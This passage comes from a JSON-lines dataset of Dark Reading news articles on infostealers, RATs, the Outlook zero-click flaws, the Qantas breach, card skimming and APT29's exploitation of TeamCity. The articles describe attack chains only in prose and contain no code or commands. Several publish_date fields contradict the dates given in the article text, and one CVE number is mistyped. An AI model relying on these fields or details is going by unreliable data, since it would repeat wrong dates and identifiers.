attacks. \"\nTo mitigate risks from browser vulnerabilities, organizations should prioritize regular updates and patch management to keep browsers up to date,\" Abbasi notes. \"\nImplementing network segmentation can restrict browser access to sensitive areas, reducing breach impacts.\"\nAbout the Author You May Also Like","num_sentences":32,"metadata":{"source":"blog","platform":"darkreading","filename":"Google-Patches"}}
{"id":96,"title":"Evasive Jupyter Infostealer Campaign Showcases Dangerous Variant","publish_date":"2022-09-28","link":"https://www.darkreading.com/cyberattacks-data-breaches/evasive-jupyter-infostealer-campaign-dangerous-variant","clean_text":"Evasive Jupyter Infostealer Campaign Showcases Dangerous VariantEvasive Jupyter Infostealer Campaign Showcases Dangerous Variant The attacks are another manifestation of the concerning rise in information stealers for harvesting data and enabling persistent access to enterprise networks.\nNovember 8, 2023 Security researchers have spotted a recent increase in attacks involving a sophisticated new variant of Jupyter, an information stealer that has been targeting users of Chrome, Edge, and Firefox browsers since at least 2020.\nThe malware, also referred to as Yellow Cockatoo, Solarmarker, and Polazert, can backdoor machines and harvest a variety of credential information, including computer name, the user's admin privileges, cookies, Web data, browser password manager information, and other sensitive data from victim systems — such as logins for crypto-wallets and remote access apps.\nA Persistent Data-Stealing Cyber Threat Researchers from VMware's Carbon Black managed detection and response (MDR) service recently observed the new version of the malware leveraging PowerShell command modifications and legitimate-looking, digitally signed payloads, infecting a steadily rising number of systems since late October. \"\nThe recent Jupyter infections utilize multiple certificates to sign their malware which, in turn, can allow trust to be granted to the malicious file, providing initial access to the victim’s machine,\" VMware said in its security blog this week. \"\nThese modifications seem to enhance [Jupyter's] evasion capabilities, allowing it to remain inconspicuous.\"\nMorphisec and BlackBerry — two other vendors that have previously tracked Jupyter — have identified the malware as capable of functioning as a full-fledged backdoor.\nThey have described its capabilities as including support for command and control (C2) communications, acting as a dropper and loader for other malware, hollowing shell code to evade detection, and executing PowerShell scripts and commands.\nBlackBerry has reported observing Jupyter also targeting crypto-wallets, such as Ethereum Wallet, MyMonero Wallet, and Atomic Wallet, in addition to accessing OpenVPN, Remote Desktop Protocol, and other remote access applications.\nThe operators of the malware have used a variety of techniques to distribute the malware, including search engine redirects to malicious websites, drive-by downloads, phishing, and SEO poisoning — or maliciously manipulating search engine results to deliver malware.\nJupyter: Getting Around Malware Detection In the most recent attacks, the threat actor behind Jupyter has been using valid certificates to digitally sign the malware so that it appears legitimate to malware detection tools.\nThe files have names designed to try to trick users into opening them, with titles such as \"An-employers-guide-to-group-health-continuation.exe\" and \"How-To-Make-Edits-On-A-Word-Document-Permanent.exe\".\nVMware researchers observed the malware making multiple network connections to its C2 server to decrypt the infostealer payload and load it into memory, almost immediately upon landing on a victim system. \"\nTargeting Chrome, Edge, and Firefox browsers, Jupyter infections use SEO poisoning and search engine redirects to encourage malicious file downloads that are the initial attack vector in the attack chain,\" according to VMware's report. \"\nThe malware has demonstrated credential harvesting and encrypted C2 communication capabilities used to exfiltrate sensitive data.\"\nJupyter's first- and second-stage payloads are noticeably different than the previous renditions first seen in September 2022, says Abe Schneider, threat analyst lead at Carbon Black in comments to Dark Reading. \"\nNew improvements to the infostealer include the use of an installer called InnoSetup, which is the first payload seen on the victim device,\" he says.\nSchneider describes Innosetup as a free software tool that threat actors frequently use to install malicious files.\nAs an example, he points to recent instances where attackers have used Innosetup to deliver Autodesk as a remote desktop app on victim devices.\nWith Jupyter, the Innosetup installer contains the second encrypted payload, Schneider says: \"Once the second payload is decrypted via PowerShell, a backdoor is loaded into memory.\nThis backdoor is then used to execute PowerShell and steal credentials from browsers, steal cryptocurrency wallets or load additional payloads into memory.\"\nA Troubling Increase in Infostealers Jupyter is among the top 10 most frequent infections that VMware has detected on client networks in recent years, according to the vendor.\nThat is consistent with what others have reported about a sharp and concerning rise in the use of infostealers following the large-scale shift to remote work at many organizations after the COVID-19 pandemic began.\nRed Canary, for instance, reported that infostealers such as RedLine, Racoon, and Vidar made its top 10 lists multiple times in 2022.\nMost often, the malware arrived as fake or poisoned installer files for legitimate software via malicious advertisements or through SEO manipulation.\nThe company found attackers using the malware mainly to try to gather credentials from remote workers that enabled quick, persistent, and privileged access to enterprise networks and systems. \"\nNo industry is immune to stealer malware and the spread of such malware is often opportunistic, usually through advertising and SEO manipulation,\" Red Canary researchers said.\nUptycs reported a similar and troubling increase in infostealer distribution earlier this year.\nData that the company tracked showed the number of incidents in which an attacker deployed an infostealer more than doubling in the first quarter of 2023, compared to the same period last year.\nThe security vendor found threat actors using the malware to steal usernames and passwords, browser information such as profiles and autofill information, credit card information, crypto-wallet info, and system information.\nNewer infostealers such as Rhadamanthys can also specifically steal logs from multifactor authentication applications, according to Uptycs.\nLogs containing the stolen data is then sold on criminal forums, where there is a heavy demand for it. \"\nExfiltration of stolen data has a dangerous impact on organizations or individuals, as it can easily be sold on the dark web as an initial access point for other threat actors,\" Uptycs researchers warned.\nAbout the Author You May Also Like","num_sentences":34,"metadata":{"source":"blog","platform":"darkreading","filename":"Jupyter-Infostealer"}}
{"id":97,"title":"Attackers Exploit 6-Year-Old Microsoft Office Bug to Spread Spyware","publish_date":null,"link":"https://www.darkreading.com/cloud-security/attackers-exploit-microsoft-office-bug-spyware","clean_text":"Attackers Exploit 6-Year-Old Microsoft Office Bug to Spread SpywareAttackers Exploit 6-Year-Old Microsoft Office Bug to Spread Spyware Malicious attachments that exploit an RCE flaw from 2017 are propagating Agent Tesla via socially engineered emails and an evasive infection method.\nDecember 20, 2023 Attackers are exploiting a 6-year-old Microsoft Office remote code execution (RCE) flaw to deliver spyware, in an email campaign weaponized by malicious Excel attachments and characterized by sophisticated evasion tactics.\nThreat actors dangle lures relating to business activity in spam emails that deliver files that contain CVE-2017-11882, an RCE flaw that dates back to 2014 and can allow for system takeover, Zscaler revealed in a blog post published Dec. 19.\nThe end goal of the attack is to load Agent Tesla, a remote access Trojan (RAT) and advanced keylogger first discovered in 2014, and exfiltrate credentials and other data from an infected system via a Telegram bot run by the attackers.\nCVE-20170-11882 is a memory-corruption flaw found in the Equation Editor of Microsoft Office.\nAn attacker who successfully exploits the flaw can run arbitrary code in the context of the current user and even take over the affected system if a user is logged on with administrator rights.\nThough the vulnerability has long been patched, older versions of Microsoft Office still in use may be vulnerable.\nDespite being nearly a decade old, Agent Tesla remains a common weapon used by attackers and includes features such as clipboard logging, screen keylogging, screen capturing, and extracting stored passwords from different Web browsers.\nThe attack vector is unique in that it pairs a longstanding vulnerability with new complexity and evasion tactics that demonstrate adaption in attackers' infection methods, thus \"making it imperative for organizations to stay updated on evolving cyber threats to safeguard their digital landscape,\" Zscaler senior security researcher Kaivalya Khursale noted in the post.\nEmail-Based Cyberattack: Typical Lures, Novel Tactics In its initial infection vector, the campaign seems unexceptional, with threat actors using socially engineered emails with business-oriented lures in messages peppered with words such as \"orders\" and \"invoices.\"\nThe messages add a sense of urgency by requesting an immediate response from recipients.\nBut once a user takes the bait, the attack method veers into the unconventional, the researchers found.\nOpening the malicious Excel attachment with a vulnerable version of the spreadsheet app initiates communication with a malicious destination that pushes additional files, the first of which is a heavily obfuscated VBS file that uses variable names 100 characters long.\nThis adds \"a layer of complexity to the analysis and deobfuscation,\" Khursale wrote.\nThis file in turn starts the download of a malicious JPG file, after which the VBS file executes a PowerShell executable that retrieves the Base64-encoded DLL from the image file, decodes the DLL, and loads the malicious procedures from the decoded DLL.\nAfter the PowerShell loads, there's another novel tactic: It executes the RegAsm.exe file — the primary function of which is typically associated with registry read-write operations, Khursale noted.\nHowever, in the attack context, the file's purpose is to carry out malicious activities under the guise of a genuine operation, he said.\nFrom here, the DLL fetches the Agent Tesla payload and injects a thread into the RegAsm process.\nAgent Tesla Malware in Action Once deployed, the spyware RAT proceeds to steal data from a slew of browsers, mail clients, and FTP applications, sending it to a malicious destination controlled by threat actors.\nIt also attempts to deploy keyboard and clipboard hooks to monitor all keystrokes and capture data copied by the user.\nSpecifically, Agent Tesla uses window hooking, a technique used to monitor event messages, mouse events, and keystrokes.\nWhen a user acts, the threat actor's function intercepts before the action occurs, Khursale said.\nThe malware ultimately sends the exfiltrated data to a Telegram bot controlled by the threat actor.\nZscaler included a comprehensive list of indicators of compromise (IoCs) in the blog post — including a list of the Telegram URLs used for exfiltration; malicious URLS; various malicious Excel, VBS, JPG, and DLL files; and malicious executables — to help identify if a system has been compromised.\nThe post also includes an extensive list of browsers and mail and FTP clients from which Agent Tesla attempts to steal credentials to help organizations remain vigilant.\nAbout the Author You May Also Like","num_sentences":26,"metadata":{"source":"blog","platform":"darkreading","filename":"Microsoft-Office-Bug"}}
{"id":98,"title":"Microsoft Outlook Zero-Click Security Flaws Triggered by Sound File","publish_date":null,"link":"https://www.darkreading.com/vulnerabilities-threats/researchers-release-details-on-two-patched-outlook-zero-click-flaws","clean_text":"Microsoft Outlook Zero-Click Security Flaws Triggered by Sound FileMicrosoft Outlook Zero-Click Security Flaws Triggered by Sound File Attackers can chain the vulnerabilities to gain full remote code execution.\nDecember 19, 2023 Researchers this week disclosed details on two security vulnerabilities in Microsoft Outlook that, when chained together, give attackers a way to execute arbitrary code on affected systems without any user interaction.\nUnusually, both of them can be triggered using a sound file.\nOne of the flaws, tracked as CVE-2023-35384, is actually the second patch bypass that researchers at Akamai have uncovered for a critical privilege escalation vulnerability in Outlook that Microsoft first patched in March.\nThe second flaw that Akamai disclosed this week (CVE-2023-36710) is a remote code execution (RCE) vulnerability in a feature of Windows Media Foundation, and it has to do with how Windows parses sound files. \"\nAn attacker on the Internet can chain the vulnerabilities together to create a full, zero-click remote code execution (RCE) exploit against Outlook clients,\" Akamai said in a two-part blog post this week.\nArbitrary Code Execution Microsoft issued a patch for CVE-2023-35384 in August, after Akamai researchers contacted the company.\nThe flaw stems from a security feature in Outlook not properly validating if a requested URL is in a local machine zone, intranet zone, or another trusted zone.\nAttackers can trigger the vulnerability by sending an affected Outlook client an email reminder with a custom notification sound, according to Akamai. \"\nAn attacker can specify a UNC path that would cause the client to retrieve the sound file from any SMB server\" on the Internet, instead of from a safe or trusted zone, the vendor added.\nTo trigger the second vulnerability, an attacker would use the first vulnerability to send a specially crafted email that downloads a malicious sound file from an attacker-controlled server. \"\nWhen the downloaded sound file is autoplayed … it can lead to code execution on the victim machine,\" Akamai said.\nAccording to Ben Barnea, security researcher at Akamai, an attacker can exploit both vulnerabilities individually or in a chained fashion. \"\nWhile each one of them is a somewhat 'weak' vulnerability, by chaining them together against Outlook we achieved a powerful zero-click RCE vulnerability,\" he says.\nPatch, Then Patch Again As noted, this is the second time that Akamai researchers have found a way around a March patch that Microsoft issued for the Outlook privilege-escalation flaw tracked as CVE-2023-23397.\nThat original bug gives attackers a way to use a sound file to steal a user's password hash and authenticate to services to which the user has access.\nAs recently as Dec. 4, Microsoft warned of Russia's Fancy Bear group (aka Forest Blizzard) actively exploiting the flaw to gain unauthorized access to email accounts in Exchange server.\nMicrosoft's original patch sought to ensure that before Outlook handles emails containing custom notification reminders, it first verifies the safety of the URL for the sound file.\nThe patch was designed to ensure that if the URL for the custom notification sound was brought in from an untrusted/unverified domain, Outlook's default notification sound is used instead.\nBut then, Akamai researchers probing the patch discovered they could bypass it by adding a single character to a function in the Microsoft update.\nThe discovery prompted Microsoft to assign the issue a separate CVE (CVE-2023-29324) and issue a patch for it in May.\nThe new bypass that Akamai is detailing this week also arises from an issue in the original patch — and it might not be the last problem found in the patch, either. \"\nThe patch for the original vulnerability used a function called 'MapUrlToZone' to mitigate the abuse of the custom reminder sound feature,\" explains Barnea, noting that the function is a complex one and increases the attack surface available to the attacker. \"\nAs a result, the patch added more code that also had vulnerabilities in it,\" he says. \"\nWe suggested to remove the abused feature instead of using patches, since the feature does more harm than good.\"\nAbout the Author You May Also Like","num_sentences":26,"metadata":{"source":"blog","platform":"darkreading","filename":"Microsoft-Outlook"}}
{"id":99,"title":"Qantas Airlines Breached, Impacting 6M Customers","publish_date":null,"link":"https://www.darkreading.com/cyberattacks-data-breaches/qantas-airlines-breached-6m-customers","clean_text":"Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa and the Asia Pacific Qantas Airlines Breached, Impacting 6M CustomersQantas Airlines Breached, Impacting 6M Customers Passengers' personal information was likely accessed via a third-party platform used at a call center, but didn't include passport or credit card info.\nJuly 2, 2025 Australia's largest airline has been hit with a massive cyberattack.\nOn June 30, the multibillion-dollar century-old Qantas discovered a breach in a third-party platform used by one of its customer service contact centers.\nAccording to a July 2 press release, the attack was contained shortly thereafter, but not before hackers obtained access to systems with customers' personally identifying information (PII).\nQantas is investigating the incident, which it expects \"will be significant,\" alongside federal authorities.\nIt has created a dedicated customer support line and Web page for information about the attack, and implemented added measures for monitoring and access control in its IT systems.\nWhat PII Have Australians Lost?\nThe call center platform at issue housed PII belonging to around six million Qantas customers.\nThat PII includes names, email addresses, phone numbers, birth dates, and frequent flyer numbers.\nIt does not house passport information or financial data such as credit card details.\nIn an interview on the Australian Broadcasting Corporation's (ABC) Afternoon Briefing, Australia's minister for cybersecurity, Tony Burke, warned citizens of the threat of follow-on phishing attacks. \"\nBecause emails and phone numbers have been compromised, if anyone gets a cold call from Qantas: hang up.\nIf you're going to talk to Qantas on the phone, use the published number, and you make the call.\nIf you get an email that is asking you to click through on a link in any way, don't respond to it,\" he advised.\nABC spoke with one Australian who already received a scam call from someone claiming to be from Qantas.\nThe scammer said to have detected suspicious activity with her credit card, then cited the last four digits of the card — all the more eerie because credit card data was not included in the breach itself.\nHackers today have more than enough tools to combine PII from separate breaches to create convincing phishing attacks. \"\nThey are almost certainly feeding all of the information about every individual they have ever stolen information about into an AI system, then asking that AI system to scan the Internet and other resources for additional information about all of them,\" Apollo Information Systems CISO Andy Bennett speculates. \"\nWith enough information, they can rapidly develop a deep understanding of any person and any company.\nFrom there it is trivial to create custom attacks targeting thousands of specific individuals across tens or hundreds of organizations at a time.\"\nAustralia's Struggle with Major Data Breaches Australia's unique position in the world has always made it an outsize target for serious hackers.\nA spokesperson from CyberCX — which aided in Qantas' incident response — told ABC that the attack has \"all the hallmarks\" of an attack by the advanced persistent threat (APT) group Scattered Spider (aka UNC3944, 0ktapus, Roasted Oktapus, Scatter Swine, Octo Tempest, Muddled Libra).\nThe accusation comes just days after the FBI warned the public that Scattered Spider has increasingly been targeting the aviation sector of late.\nTo date, Qantas itself has made no attribution, or indicated whether the attack might have come packaged with ransomware. \"\nThe country's attractiveness to attackers comes from its economic stability, high-value targets, and geopolitical position — caught between major powers like the US and China,\" explains Bugcrowd founder Casey Ellis.\nIt certainly faces significant threats per capita, with recent incidents at Medibank, Latitude Financial, and Optus exceeding Qantas' latest.\nEach affected at least around 10 million customers, in a country of just 26.6 million people.\nThe government has done its best to keep up with the threat, Ellis notes, with initiatives like its $1.67 billion cybersecurity strategy and critical infrastructure legislation. \"\nIn general, legislation is a step forward, but it's never a silver bullet.\nIt's also a trailing indicator, and rarely a leading one (although Australia has made efforts to be proactive through cybersecurity policy and legislation),\" he says. \"\nCybersecurity is a moving target, and attackers are constantly evolving.\nThe challenge lies in translating policy into effective, real-world defenses while fostering collaboration between government, industry, and the ethical hacker community.\"\nDark Reading has contacted Qantas and CyberCX for further information about this ongoing story.\nRead more about: DR Global Asia PacificAbout the Author You May Also Like","num_sentences":34,"metadata":{"source":"blog","platform":"darkreading","filename":"Qantas"}}
{"id":100,"title":"Threat Group Using Rare Data Transfer Tactic in New RemcosRAT Campaign","publish_date":"2023-02-28","link":"https://www.darkreading.com/cyberattacks-data-breaches/threat-group-using-rare-data-transfer-tactic-in-new-remcosrat-campaign","clean_text":"Threat Group Using Rare Data Transfer Tactic in New RemcosRAT CampaignThreat Group Using Rare Data Transfer Tactic in New RemcosRAT Campaign UNC-0050 is targeting government agencies in Ukraine in what appears to be a politically motivated intelligence-gathering operation.\nJanuary 5, 2024 A threat actor known for repeatedly targeting organizations in Ukraine with the RemcosRAT remote surveillance and control tool is back at it again, this time with a new tactic for transferring data without triggering endpoint detection and response systems.\nThe adversary, tracked as UNC-0050, is focused on Ukrainian government entities in its latest campaign.\nResearchers at Uptycs who spotted it said the attacks may be politically motivated, with the goal of collecting specific intelligence from Ukrainian government agencies. \"\nWhile the possibility of state sponsorship remains speculative, the group's activities pose an undeniable risk, especially to government sectors reliant on Windows systems,\" Uptycs researchers Karthickkumar Kathiresan and Shilpesh Trivedi wrote in a report this week.\nThe RemcosRAT Threat Threat actors have been using RemcosRAT — which started life as a legitimate remote administration tool — to control compromised systems since at least 2016.\nAmong other things, the tool allows attackers to gather and exfiltrate system, user, and processor information.\nIt can bypass many antivirus and endpoint threat detection tools and execute a variety of backdoor commands.\nIn many instances threat actors have distributed the malware in attachments in phishing emails.\nUptycs has not been able to determine the initial attack vector in the latest campaign just yet but said it is leaning toward job-themed phishing and spam emails as most likely being the malware distribution method.\nThe security vendor based its assessments on emails it reviewed that purported to offer targeted Ukrainian military personnel with consultancy roles at Israel's Defense Forces.\nThe infection chain itself begins with a .lnk file that gathers information about the compromised system and then retrieves an HTML app named 6.hta from an attacker-controlled remote server using a Windows native binary, Uptycs said.\nThe retrieved app contains a PowerShell script that initiates steps to download two other payload files (word_update.exe and ofer.docx) from an attacker-controlled domain and — ultimately — to install RemcosRAT on the system.\nA Somewhat Rare Tactic What makes UNC-0050's new campaign different is the threat actor's use of a Windows interprocess communications feature called anonymous pipes to transfer data on compromised systems.\nAs Microsoft describes it, an anonymous pipe is a one-way communications channel for transferring data between a parent and a child process.\nUNC-0050 is taking advantage of the feature to covertly channel data without triggering any EDR or antivirus alerts, Kathiresan and Trivedi said.\nUNC-0050 is not the first threat actor to use pipes to exfiltrate stolen data, but the tactic remains relatively rare, the Uptycs researchers noted. \"\nAlthough not entirely new, this technique marks a significant leap in the sophistication of the group's strategies,\" they said.\nThis is far from the first time that security researchers have spotted UAC-0050 attempting to distribute RemcosRAT to targets in Ukraine.\nOn multiple occasions last year, Ukraine's Computer Emergency Response Team (CERT-UA) warned of campaigns by the threat actor to distribute the remote access Trojan to organizations in the country.\nThe most recent was an advisory on Dec. 21, 2023, about a mass phishing campaign involving emails with an attachment that purported be a contract involving Kyivstar, one of Ukraine's largest telecommunications providers.\nEarlier in December, CERT-UA warned of another RemcosRAT mass distribution campaign, this one involving emails purporting to be about \"judicial claims\" and \"debts\" targeting organizations and individuals in Ukraine and Poland.\nThe emails contained an attachment in the form of an archive file or RAR file.\nCERT-UA issued similar alerts on three other occasions last year, one in November with court subpoena-themed emails serving as the initial delivery vehicle; another, also in November, with emails allegedly from Ukraine's security service; and the first in February 2023 about a mass email campaign with attachments that appeared to be associated with a district court in Kyiv.\nAbout the Author You May Also Like","num_sentences":25,"metadata":{"source":"blog","platform":"darkreading","filename":"RemcosRAT"}}
{"id":101,"title":"Payment Card-Skimming Campaign Now Targeting Websites in North America","publish_date":"2023-05-28","link":"https://www.darkreading.com/cyberattacks-data-breaches/payment-card-skimming-campaign-now-targeting-websites-in-north-america","clean_text":"Payment Card-Skimming Campaign Now Targeting Websites in North AmericaPayment Card-Skimming Campaign Now Targeting Websites in North America \"Silent Skimmer\" is a technically complex campaign that has successfully targeted online businesses in the Asia Pacific region for over a year.\nSeptember 18, 2023 A Chinese-speaking threat actor that has been skimming credit card numbers off ecommerce sites and point-of-sale service providers in the Asia/Pacific region for more than a year has begun aiming at similar targets in North and Latin America as well.\nIn a series of attacks since at least May 2023, the adversary has exploited vulnerabilities in Web applications — including one vulnerability that China's Hafnium group has used in cyber espionage campaigns — to gain access to sites belonging to organizations across multiple industry sectors.\nThe primary goal in these attacks is to gain access to the payment pages on these sites and drop malware for stealing card numbers belonging to people making online purchases.\nThe Silent Skimmer Campaign Researchers from BlackBerry discovered the campaign and are tracking it as \"Silent Skimmer.\"\nIn a blog post this week, they described the campaign as technically complex and one that might well involve an advanced or experienced threat actor.\nCard-skimming attacks are certainly not new.\nA loose collection of hacking groups that researchers have been tracking as Magecart have for years, in fact, been successfully stealing payment card data belonging to hundreds of millions of online shoppers around the world.\nIn many of these attacks, the threat actors have targeted vulnerabilities in third-party software components and plug-ins — such as page view counters and visitor tracking widgets — and injected card skimming code into them.\nHundreds of thousands of e-commerce sites have been victim to Magecart attacks in recent years, including British Airways, Ticketmaster, Newegg, and numerous others.\nThe operator of the Silent Skimmer campaign has been opportunistically exploiting vulnerabilities in Web-facing applications to gain initial access to websites.\nMany of the sites the threat actor was attacking were hosted on Microsoft's Internet Information Services (IIS) Web server software.\nOne of the vulnerabilities the threat actor has exploited in its campaign is CVE-2019-18935, a critical remote code execution bug in Telerik UI, a suite of components and Web development tools from Progress Software.\nAmong the groups that have used the bug in their campaigns is China's Hafnium group and Vietnam's XE Group.\nIf the target Web service has write permissions enabled, the exploit uploads a malicious dynamic link library (DLL) to a specific directory on it.\nThe DLL then initiates a sequence of steps that results in malware for skimming credit and debit card data being installed on the website.\nTechnically Complex Campaign BlackBerry researchers have observed the threat actor using multiple separate tools for privilege escalation, as well as a remote access tool, a remote code execution exploit, a malware stager/downloader, and a tool for post-exploit activities.\nAs is often the case with malware campaigns these days, the operator of Silent Skimmer has relied on a slew of legitimate open source tools, binaries, and scripts in many of its attacks.\nOne indication that the threat actor behind Silent Skimmer is technically skilled is how it has readjusted its command-and-control (C2) infrastructure based on the geolocation of the victims.\nFor the campaign, the threat actor has used virtual private servers (VPS) — often on Microsoft's Azure platform — as C2 servers for newly acquitted targets.\nEach C2 server is typically online for less than a week and is often located in the same region or country as the victim.\nFor Canadian victims, for example, BlackBerry found the threat actor set up a VPS in Canada, while for US victims, the VPS servers were usually within the same state as the victim.\nThe goal behind the tactic is to ensure that traffic to and from the compromised servers blends in with normal traffic, BlackBerry said.\nAbout the Author You May Also Like","num_sentences":24,"metadata":{"source":"blog","platform":"darkreading","filename":"Silent Skimmer"}}
{"id":102,"title":"Syrian Threat Group Peddles Destructive SilverRAT","publish_date":"2023-11-28","link":"https://www.darkreading.com/cyberattacks-data-breaches/syrian-threat-group-peddles-destructive-silverrat","clean_text":"Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa and the Asia Pacific Syrian Threat Group Peddles Destructive SilverRATSyrian Threat Group Peddles Destructive SilverRAT The Middle Eastern developers claim to be building a new version of the antivirus-bypassing remote access Trojan (RAT) attack tool.\nJanuary 5, 2024 The group behind a sophisticated remote access Trojan, SilverRAT, has links to both Turkey and Syria and plans to release an updated version of the tool to allow control over compromised Windows systems and Android devices.\nAccording to a threat analysis published on Jan. 3, SilverRAT v1 — which currently works only on Windows systems — allows the building of malware for keylogging and ransomware attacks, and includes destructive features, such as the ability to delete system restore points, researchers from Singapore-based Cyfirma stated in their analysis.\nSilverRAT Builder Allows Various Features SilverRAT shows that the region's cybercriminal groups are becoming more sophisticated, according to Cyfirma's analysis.\nThe first version of SilverRAT, whose source code was leaked by unknown actors in October, consists of a builder that allows the user to construct a remote access Trojan with specific features.\nThe more interesting features, according to Cyfirma's analysis, include using either an IP address or webpage for command and control, bypasses for antivirus software, the ability to erase system restore points, and the delayed execution of payloads.\nAt least two threat actors — one using the handle \"Dangerous silver\" and a second using \"Monstermc\" — are the developers behind both SilverRAT and a previous program, S500 RAT, according to Cyfirma's analysis.\nThe hackers operate on Telegram and through online forums where they sell malware-as-a-service, distribute cracked RATs from other developers, and offer a variety of other services.\nIn addition, they have a blog and website called Anonymous Arabic. \"\nThere are two people managing SilverRAT,\" says Rajhans Patel, a threat researcher with Cyfirma. \"\nWe have been able to gather photographic evidence of one of the developers.\"\nStarting From Forums The group behind the malware, dubbed Anonymous Arabic, is active on Middle Eastern forums, such as Turkhackteam, 1877, and at least one Russian forum.\nIn addition to the development of SilverRAT, the group's developers offer a distributed denial-of-service (DDoS) attacks on demand, says Koushik Pal, a threat researcher with the Cyfirma Research team. \"\nWe have observed some activity from Anonymous Arabic since late November 2023,\" he says. \"\nThey are known to be using a botnet being advertised on Telegram known as 'BossNet' to conduct DDOS attacks on large entities.\"\nWhile the Middle East threat landscape has been dominated by the state-run and state-sponsored hacking groups in Iran and Israel, homegrown groups such as Anonymous Arabic continue to dominate the cybercrime markets.\nThe ongoing development of tools such as SilverRAT highlight the dynamic nature of the underground markets in the region.\nThe SilverRAT dashboard for building trojans.\nSource: Cyfirma Hacking groups in the Middle East tend to be quite varied, says Sarah Jones, a cyber threat intelligence research analyst at managed detection and response firm Critical Start, who cautioned that individual hacking groups are constantly evolving and generalizing their characteristics can be problematic. \"\nThe level of technical sophistication varies greatly among groups in the Middle East,\" she says. \"\nSome state-backed actors possess advanced capabilities, while others rely on simpler tools and techniques.\"\nA Gateway Through Game Hacks Of the identified members of the Anonymous Arabic group, at least one is a former game hacker, according to data gathered by researchers at Cyfirma, including the Facebook profile, YouTube channel, and social-media posts of one of the hackers — a man in his early 20s who lives in Damascus, Syria, and started hacking as a teenager.\nThe profile of young hackers who cut their teeth on finding exploits for games transcends the hacking community in the Middle East.\nTeenagers starting their hacking careers by creating gaming hacks or launching denial-of-service attacks against game systems has become a trend.\nArion Kurtaj, a member of the Lapsus$ group, started as a Minecraft hacker and later moved on to hacking targets such as Microsoft, Nvidia, and game maker Rockstar. \"\nWe can see a similar trend with the developer of SilverRAT,\" says Rajhans Patel, a threat researcher with Cyfirma, adding in the threat analysis: \"Reviewing the developer's previous posts reveals a history of offering various first-person shooter (FPS) game hacks and mods.\"\nThe US Department of Homeland Security's Cyber Safety Review Board (CSRB), which conducts post-mortem analysis of major hacks, identified the continuing pipeline from juvenile hackers to cybercriminal enterprises as a existential danger.\nGovernments and private organizations should put in place holistic programs to redirect juveniles away from cybercrime, the CSRB found in its analysis of the success of the Lapsus$ group in attacking \"some of the world's most well-resourced and well-defended companies.\"\nYet young programmers and technology-savvy teenagers often find other ways into the cybercriminal fold as well, says Critical Start's Jones. \"\nHackers, like any population group, are diverse individuals with varied motivations, skills, and approaches,\" she says. \"\nWhile some hackers may start out with game hacks and move to more serious tools and techniques, we often find that cybercriminals tend to target industries and countries with weaker cyber defenses.\"\nRead more about: DR Global Middle East & AfricaAbout the Author You May Also Like","num_sentences":32,"metadata":{"source":"blog","platform":"darkreading","filename":"SilverRAT"}}
{"id":103,"title":"Global TeamCity Exploitation Opens Door to SolarWinds-Style Nightmare","publish_date":null,"link":"https://www.darkreading.com/vulnerabilities-threats/global-teamcity-exploitation-opens-door-to-solarwinds-style-nightmare","clean_text":"Global TeamCity Exploitation Opens Door to SolarWinds-Style NightmareGlobal TeamCity Exploitation Opens Door to SolarWinds-Style Nightmare Russia's APT29 is going after a critical RCE flaw in the JetBrains TeamCity software developer platform, prompting governments worldwide to issue an urgent warning to patch.\nAPT29, the notorious Russian advanced persistent threat behind the 2020 SolarWinds hack, is actively exploiting a critical security vulnerability in JetBrains TeamCity that could open the door to rampant software supply chain attacks.\nThat's the word from CISA, the FBI, the NSA, and a host of international partners, who said in a joint alert today that APT29 (aka CozyBear, the Dukes, Midnight Blizzard, or Nobelium) is hammering servers hosting TeamCity software \"at a large scale\" using the unauthenticated remote code execution (RCE) bug.\nAccording to the feds, the exploitation of the issue, tracked as CVE-2023-42793 (CVSS score of 9.8), started in September after JetBrains patched the flaw and Rapid7 released a public proof-of-concept (PoC) exploit for it; but now, it has grown to be a worrying global phenomenon that could result in widespread damage.\nThe affected platform is a software development lifecycle (SDLC) management tool, which houses everything from source code to signing certificates.\nSuccessful incursions could give cyberattackers access to that valuable data, but could also provide a way to alter software compilations and deployment processes — raising the possibility that another SolarWinds-type attack wave could be in the offing. \"[\nAn exploit] may allow for deploying a malicious update which, in the simplest scenario, could execute adversary tools resulting in enabling access to devices or whole networks,\" according to Wednesday's joint alert on the TeamCity attacks. \"\nIn more complicated scenarios, access to the build pipeline could allow for compromising compiled source code and for introduction of almost indetectable modification to software — such as minuscule changes to cryptography protocols that could enable decryption of the protected data.\"\nPersistent TeamCity Backdoors Withstand Patching In the SolarWinds incident, APT29 was able to stow away on legitimate SolarWinds software updates, landing automatically on legions of victim networks.\nFrom the 18,000 compromised, the group cherry-picked targets for second-wave incursions, successfully infiltrating several US government agencies and tech companies including Microsoft and FireEye (now part of Trellix).\nFor now, the TeamCity attacks have not yet gone that far.\nBut APT29, which the agencies have linked to Russia's Foreign Intelligence Service (SVR), has \"been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments,\" according to the alert.\nAnd indeed, if you're a nation-state threat looking for prime lurking opportunities, one of the benefits of using the exploit is the fact that patching alone won't mitigate the danger.\nAs JetBrains pointed out in its original bug advisory, \"Any backdoors are likely to persist and remain undetected after the TeamCity upgrade or security patch plugin are subsequently applied, leaving environments at risk of further exploitation.\"\nAccording to Shadowserver, there are at first glance at least 800 unpatched TeamCity software instances worldwide exposed to the Internet; it's unclear how many instances have been patched but may remain compromised.\nAnd of course, that number doesn't take into account unexposed instances that are reachable by sophisticated adversaries with prior access to corporate networks.\nFlurry of APTs Target Developers Through CVE-2023-42793 APT29 is not the only state-sponsored cyberthreat to take notice of the tantalizing prizes on offer in vulnerable TeamCity instances.\nIn October, Microsoft's Threat Intelligence Center pointed to several North Korea-backed APTs, including Lazarus Group (aka Diamond Sleet, Hidden Cobra, or Zinc) and its offshoot Andariel (aka Onyx Sleet or Plutonium), using the TeamCity vuln to install persistent backdoors.\nAnd in some cases, there is more than one Big Bad at work.\nResearchers at cybersecurity firm Fortinet — which issued a deep-dive on Wednesday into the mechanics of a real-world incident at a US biomedical manufacturing company, along with indicators of compromise (IoC) and mitigation guidance — noted that \"observed exploitation originated from multiple disparate threat actors who employed numerous diverse post-exploitation techniques in an attempt to gain a foothold in the victim network.\"\nHow to Protect Against JetBrains TeamCity Cyberattacks To combat the danger posed by the TeamCity bug — i.e., \"enormous damages for the economy, civilian organizations, or public 